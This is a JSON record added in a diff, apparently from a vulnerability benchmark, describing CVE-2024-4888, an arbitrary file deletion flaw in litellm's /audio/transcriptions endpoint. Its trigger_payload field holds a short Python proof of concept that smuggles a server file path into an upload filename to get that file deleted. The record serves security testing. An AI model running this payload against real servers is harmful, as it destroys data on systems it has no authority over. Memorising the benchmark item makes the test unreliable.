@@ -1,0 +1,15 @@
+{
+  "file_id": "66_litellm_huntr_48461d89-cf13-4ad3-a43e-0d37da08fc6c",
+  "numeric_id": "66",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "Arbitrary file deletion via /audio/transcriptions endpoint due to missing authorization",
+  "cve": "CVE-2024-4888",
+  "cwe": "CWE-862: Missing Authorization",
+  "library": "litellm",
+  "affected_version": "latest",
+  "vulnerable_function": "os.remove",
+  "triggerability": "direct",
+  "trigger_payload": "import requests\n\ndef upload_file(api_key):\n    header = {\n        \"Authorization\": f\"Bearer {api_key}\"\n    }\n    files = {\n        'file': ('/IMPORTANTFILE.txt', '/IMPORTANTFILE.txt', 'text/plain'),\n    }\n    response = requests.post('http://localhost:4000/audio/transcriptions', files=files)\n    print(response.text)\n\nupload_file(\"apikeyhere\")\npython3 test.py",
+  "oracle": "The file /IMPORTANTFILE.txt is deleted from the server filesystem"
+}
